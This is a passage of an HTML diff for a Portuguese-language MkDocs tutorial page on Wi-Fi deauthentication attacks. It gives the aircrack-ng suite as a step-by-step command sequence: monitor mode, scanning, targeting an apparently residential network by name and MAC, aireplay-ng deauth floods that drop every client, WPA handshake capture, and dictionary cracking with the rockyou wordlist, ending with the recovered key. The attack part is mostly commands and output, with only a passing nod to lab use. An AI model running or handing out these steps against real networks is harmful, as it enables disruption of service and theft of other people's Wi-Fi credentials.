+      Até esse ponto apenas teríamos um ataque de Negação de serviço (DDOS), MAS, nós salvamos um arquivo com informações (capturados.cap) e vamos usá-lo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#instale-o-wireshark-e-abra-o-arquivo-de-captura-filtrando-mensagens-criptografadas-do-tipo-eapol" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instale o Wireshark e abra o arquivo de captura, filtrando mensagens criptografadas, do tipo EAPOL:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#baixe-sua-wordlist-para-quebrar-a-senha-capturada-usando-o-aircrack-ng" class="md-nav__link">
+    <span class="md-ellipsis">
+      Baixe sua wordlist para quebrar a senha capturada usando o aircrack-ng:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#focaremos-apenas-em-senhas-que-contenham-de-8-a-64-caracteres-diminuindo-o-tempo-de-conjuncoes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Focaremos apenas em senhas que contenham de 8 a 64 caracteres, diminuindo o tempo de conjunções:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#o-resultado-deve-ser-uma-mensagem" class="md-nav__link">
+    <span class="md-ellipsis">
+      O resultado deve ser uma mensagem:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#retira-a-placa-de-rede-wi-fi-do-modo-monitoramento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Retira a placa de rede wi-fi do modo monitoramento:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#restaura-sua-placa-de-rede-para-navegacao" class="md-nav__link">
+    <span class="md-ellipsis">
+      Restaura sua placa de rede para navegação:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alternativa-de-varredura-de-rede-pelo-terminal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Alternativa de varredura de rede pelo terminal:
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Sistemas Operacionais
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Sistemas Operacionais
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OpenSUSE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpenSUSE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#instala-a-ferramenta-de-monitoramento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instala a ferramenta de monitoramento:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valida-o-nome-da-sua-placa-de-rede-wi-fi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Valida o nome da sua placa de rede wi-fi:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valida-possiveis-conflitos-de-hardware-antes-de-iniciar-os-processos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Valida possíveis conflitos de hardware antes de iniciar os processos:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#coloca-a-placa-de-rede-wi-fi-em-modo-monitoramento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Coloca a placa de rede wi-fi em modo monitoramento:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valida-o-novo-nome-da-sua-placa-de-captura-de-redes-wi-fi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Valida o novo nome da sua placa de captura de redes wi-fi:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inicia-o-scan-de-todas-as-redes-proximas-aparecerao-diversas-redes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Inicia o scan de todas as redes próximas (aparecerão diversas redes):
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#encerra-o-scan-das-redes-apos-escolher-o-alvo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Encerra o scan das redes após escolher o alvo:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#anote-o-essid-nome-da-rede-alvo-bem-como-o-bssid-mac-e-tbem-o-canal-ch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Anote o ESSID (Nome) da rede alvo, bem como o BSSID (MAC) e tbém o CANAL (CH):
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#podemos-validar-apenas-a-rede-alvo-se-preferir" class="md-nav__link">
+    <span class="md-ellipsis">
+      Podemos validar apenas a rede alvo, se preferir:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#posso-me-conectar-a-rede-wi-fi-alvo-se-for-um-laboratorio-usando-um-celular" class="md-nav__link">
+    <span class="md-ellipsis">
+      Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vai-constar-o-novo-cliente-com-dados-do-aparelho-definidos-em-station" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vai constar o novo cliente, com dados do aparelho, definidos em STATION.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#subo-o-comando-de-captura-de-pacotes-da-rede-alvo-e-salvo-o-arquivo-de-captura" class="md-nav__link">
+    <span class="md-ellipsis">
+      Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inicia-o-ataque-ao-roteador-alvo-todos-os-clientes-caem-durante-o-ataque" class="md-nav__link">
+    <span class="md-ellipsis">
+      Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ao-tentar-re-conexao-os-clientes-entregam-o-handshake-de-4-vias-no-terminal-01" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#podemos-encerrar-a-captura-no-terminal-01" class="md-nav__link">
+    <span class="md-ellipsis">
+      Podemos encerrar a captura no TERMINAL 01
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#podemos-encerrar-o-ataque-no-terminal-02" class="md-nav__link">
+    <span class="md-ellipsis">
+      Podemos encerrar o ataque no TERMINAL 02
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ate-esse-ponto-apenas-teriamos-um-ataque-de-negacao-de-servico-ddos-mas-nos-salvamos-um-arquivo-com-informacoes-capturadoscap-e-vamos-usa-lo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Até esse ponto apenas teríamos um ataque de Negação de serviço (DDOS), MAS, nós salvamos um arquivo com informações (capturados.cap) e vamos usá-lo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#instale-o-wireshark-e-abra-o-arquivo-de-captura-filtrando-mensagens-criptografadas-do-tipo-eapol" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instale o Wireshark e abra o arquivo de captura, filtrando mensagens criptografadas, do tipo EAPOL:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#baixe-sua-wordlist-para-quebrar-a-senha-capturada-usando-o-aircrack-ng" class="md-nav__link">
+    <span class="md-ellipsis">
+      Baixe sua wordlist para quebrar a senha capturada usando o aircrack-ng:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#focaremos-apenas-em-senhas-que-contenham-de-8-a-64-caracteres-diminuindo-o-tempo-de-conjuncoes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Focaremos apenas em senhas que contenham de 8 a 64 caracteres, diminuindo o tempo de conjunções:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#o-resultado-deve-ser-uma-mensagem" class="md-nav__link">
+    <span class="md-ellipsis">
+      O resultado deve ser uma mensagem:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#retira-a-placa-de-rede-wi-fi-do-modo-monitoramento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Retira a placa de rede wi-fi do modo monitoramento:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#restaura-sua-placa-de-rede-para-navegacao" class="md-nav__link">
+    <span class="md-ellipsis">
+      Restaura sua placa de rede para navegação:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alternativa-de-varredura-de-rede-pelo-terminal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Alternativa de varredura de rede pelo terminal:
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ataque-de-deauth-ou-dissociacao-de-redes-wi-fi">Ataque de Deauth ou Dissociação de Redes WI-FI</h1>
+<p>Redes cabeadas se autenticam com 3 Way Handshake, eqto redes de Wi-fi autenticam com 4 Way Handshake.</p>
+<p>🛡️ Como funciona um ataque de desautenticação?</p>
+<p>Os atacantes que desejam realizar um ataque de desautenticação geralmente usam dispositivos habilitados para Wi-Fi e software especializado. O processo básico envolve o seguinte:</p>
+<div class="highlight"><pre><span></span><code>- Captura de tráfego Wi-Fi: O atacante inicia a captura de tráfego da rede Wi-Fi alvo usando ferramentas como um sniffer de pacotes.
+- Identificação de dispositivos-alvo: O atacante identifica os dispositivos que desejam desconectar da rede.
+- Envio de pacotes de desautenticação: Usando o endereço MAC dos dispositivos-alvo, o atacante envia pacotes de desautenticação, forçando os dispositivos a se desconectarem da rede.
+- Repetição contínua: O atacante pode repetir esse processo para manter os dispositivos desconectados da rede.
+</code></pre></div>
+<p>🎯 Objetivos de um ataque de desautenticação de Wi-Fi</p>
+<p>Os atacantes realizam ataques de desautenticação de Wi-Fi por várias razões, incluindo:</p>
+<div class="highlight"><pre><span></span><code>- Interrupção da conectividade: Desconectar dispositivos da rede pode causar interrupções significativas nas operações normais, afetando a produtividade e o acesso à Internet.
+- Espionagem: O ataque pode ser usado como uma tática para espionar o tráfego de rede dos dispositivos-alvo enquanto eles tentam se reconectar à rede.
+- Ameaças cibernéticas: Em alguns casos, os ataques de desautenticação podem ser o primeiro passo para invasões mais graves, como ataques de força bruta a senhas.
+</code></pre></div>
+<h2 id="instala-a-ferramenta-de-monitoramento">Instala a ferramenta de monitoramento:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>aircrack-ng
+</code></pre></div>
+<h2 id="valida-o-nome-da-sua-placa-de-rede-wi-fi">Valida o nome da sua placa de rede wi-fi:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ip<span class="w"> </span>-c<span class="w"> </span>addr
+</code></pre></div>
+<h2 id="valida-possiveis-conflitos-de-hardware-antes-de-iniciar-os-processos">Valida possíveis conflitos de hardware antes de iniciar os processos:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>check<span class="w"> </span><span class="nb">kill</span>
+</code></pre></div>
+<h2 id="coloca-a-placa-de-rede-wi-fi-em-modo-monitoramento">Coloca a placa de rede wi-fi em modo monitoramento:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlan0
+</code></pre></div>
+<h2 id="valida-o-novo-nome-da-sua-placa-de-captura-de-redes-wi-fi">Valida o novo nome da sua placa de captura de redes wi-fi:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ip<span class="w"> </span>-c<span class="w"> </span>addr
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo<span class="w"> </span>airmon-ng
+</code></pre></div>
+<h2 id="inicia-o-scan-de-todas-as-redes-proximas-aparecerao-diversas-redes">Inicia o scan de todas as redes próximas (aparecerão diversas redes):</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan0mon
+</code></pre></div>
+<h2 id="encerra-o-scan-das-redes-apos-escolher-o-alvo">Encerra o scan das redes após escolher o alvo:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ctrl+c
+</code></pre></div>
+<h2 id="anote-o-essid-nome-da-rede-alvo-bem-como-o-bssid-mac-e-tbem-o-canal-ch">Anote o ESSID (Nome) da rede alvo, bem como o BSSID (MAC) e tbém o CANAL (CH):</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Condominio_Flores_II
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="m">64</span>:D1:54:09:EE:3E
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="m">4</span>
+</code></pre></div>
+<h2 id="podemos-validar-apenas-a-rede-alvo-se-preferir">Podemos validar apenas a rede alvo, se preferir:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan0mon<span class="w"> </span>-d<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
+</code></pre></div>
+<h2 id="posso-me-conectar-a-rede-wi-fi-alvo-se-for-um-laboratorio-usando-um-celular">Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.</h2>
+<h2 id="vai-constar-o-novo-cliente-com-dados-do-aparelho-definidos-em-station">Vai constar o novo cliente, com dados do aparelho, definidos em STATION.</h2>
+<p><code>TERMINAL 01</code> - VAMOS INICIAR A CAPTURA DOS PACOTES</p>
+<h2 id="subo-o-comando-de-captura-de-pacotes-da-rede-alvo-e-salvo-o-arquivo-de-captura">Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span>--bssid<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlan0mon
+</code></pre></div>
+OU
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-w<span class="w"> </span>capturados<span class="w"> </span>--channel<span class="w"> </span><span class="m">2</span><span class="w"> </span>--essid<span class="w"> </span>Condominio_Flores_II<span class="w"> </span>wlan0mon
+</code></pre></div></p>
+<p>Á partir daqui, eu aguardo algum dispositivo se conectar para realizar a captura do 4 Way Hand Shake.... OU</p>
+<p><code>TERMINAL 02</code> - VAMOS INICIAR O ATAQUE DE DESAUTENTICAÇÃO</p>
+<h2 id="inicia-o-ataque-ao-roteador-alvo-todos-os-clientes-caem-durante-o-ataque">Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>wlan0mon
+</code></pre></div>
+<p>Posso tbém, desautenticar apenas um dispositivo específico</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-a<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E<span class="w"> </span>-c<span class="w"> </span><span class="m">28</span>:6C:07:6F:F9:53<span class="w"> </span>wlan0mon
+</code></pre></div>
+<h2 id="ao-tentar-re-conexao-os-clientes-entregam-o-handshake-de-4-vias-no-terminal-01">Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="o">[</span>WPA<span class="w"> </span>handshake<span class="o">]</span>:<span class="w"> </span><span class="m">64</span>:D1:54:09:EE:3E
+</code></pre></div>
+<h2 id="podemos-encerrar-a-captura-no-terminal-01">Podemos encerrar a captura no TERMINAL 01</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ctrl+c
+</code></pre></div>
+<h2 id="podemos-encerrar-o-ataque-no-terminal-02">Podemos encerrar o ataque no TERMINAL 02</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ctrl+c
+</code></pre></div>
+<h2 id="ate-esse-ponto-apenas-teriamos-um-ataque-de-negacao-de-servico-ddos-mas-nos-salvamos-um-arquivo-com-informacoes-capturadoscap-e-vamos-usa-lo">Até esse ponto apenas teríamos um ataque de Negação de serviço (DDOS), MAS, nós salvamos um arquivo com informações (capturados.cap) e vamos usá-lo</h2>
+<h2 id="instale-o-wireshark-e-abra-o-arquivo-de-captura-filtrando-mensagens-criptografadas-do-tipo-eapol">Instale o Wireshark e abra o arquivo de captura, filtrando mensagens criptografadas, do tipo EAPOL:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>wireshark
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>wireshark<span class="w"> </span>capturados.cap
+</code></pre></div>
+<p>OU</p>
+<h2 id="baixe-sua-wordlist-para-quebrar-a-senha-capturada-usando-o-aircrack-ng">Baixe sua wordlist para quebrar a senha capturada usando o aircrack-ng:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>wget<span class="w"> </span>https://github.com/zacheller/rockyou.git
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>wc<span class="w"> </span>-l<span class="w"> </span>rockyou.txt
+</code></pre></div>
+<h2 id="focaremos-apenas-em-senhas-que-contenham-de-8-a-64-caracteres-diminuindo-o-tempo-de-conjuncoes">Focaremos apenas em senhas que contenham de 8 a 64 caracteres, diminuindo o tempo de conjunções:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>sudo<span class="w"> </span>grep<span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;.\{8,64\}&#39;</span><span class="w"> </span>rockyou.txt<span class="w"> </span>&gt;<span class="w"> </span>wparockyou.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>wc<span class="w"> </span>-l<span class="w"> </span>wparockyou.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>aircrack-ng<span class="w"> </span>capturados.cap<span class="w"> </span>-w<span class="w"> </span>/home/usuariox/wordlists/rockyou.txt
+</code></pre></div>
+<h2 id="o-resultado-deve-ser-uma-mensagem">O resultado deve ser uma mensagem:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>KEY<span class="w"> </span>FOUNF<span class="w"> </span><span class="o">[</span><span class="w"> </span>P@ssword123<span class="w"> </span><span class="o">]</span>
+</code></pre></div>
+<h2 id="retira-a-placa-de-rede-wi-fi-do-modo-monitoramento">Retira a placa de rede wi-fi do modo monitoramento:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>airmon-ng<span class="w"> </span>stop<span class="w"> </span>wlan0mon
+</code></pre></div>
+<h2 id="restaura-sua-placa-de-rede-para-navegacao">Restaura sua placa de rede para navegação:</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>systemctl<span class="w"> </span>restart<span class="w"> </span>NetworkManager
+</code></pre></div>
+<h2 id="alternativa-de-varredura-de-rede-pelo-terminal">Alternativa de varredura de rede pelo terminal:</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>nmcli<span class="w"> </span>device<span class="w"> </span>wifi<span class="w"> </span>list<span class="w"> </span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>N-USE<span class="w"> </span><span class="o">=</span><span class="w"> </span>rede<span class="w"> </span>que<span class="w"> </span>você<span class="w"> </span>está<span class="w"> </span>usando
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nv">BSSID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>endereço<span class="w"> </span><span class="k">do</span><span class="w"> </span>roteador
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="nv">SSID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nome<span class="w"> </span>da<span class="w"> </span>rede
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="nv">MODE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>infra<span class="w"> </span><span class="o">(</span>?<span class="o">)</span>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="nv">CHAN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>canal<span class="w"> </span>que<span class="w"> </span>está<span class="w"> </span>sendo<span class="w"> </span>utilizado<span class="w"> </span>pelo<span class="w"> </span>roteador
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="nv">RATE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>taxa<span class="w"> </span>de<span class="w"> </span>transferência
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="nv">SIGNAL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>intensidade<span class="w"> </span><span class="k">do</span><span class="w"> </span>sinal<span class="w"> </span>em<span class="w"> </span>%
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="nv">BARS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>intensidade<span class="w"> </span><span class="k">do</span><span class="w"> </span>sinal<span class="w"> </span>em<span class="w"> </span>barras
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="nv">SECURITY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>protocolos<span class="w"> </span>de<span class="w"> </span>segurança<span class="w"> </span><span class="k">do</span><span class="w"> </span>roteador
+</code></pre></div></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
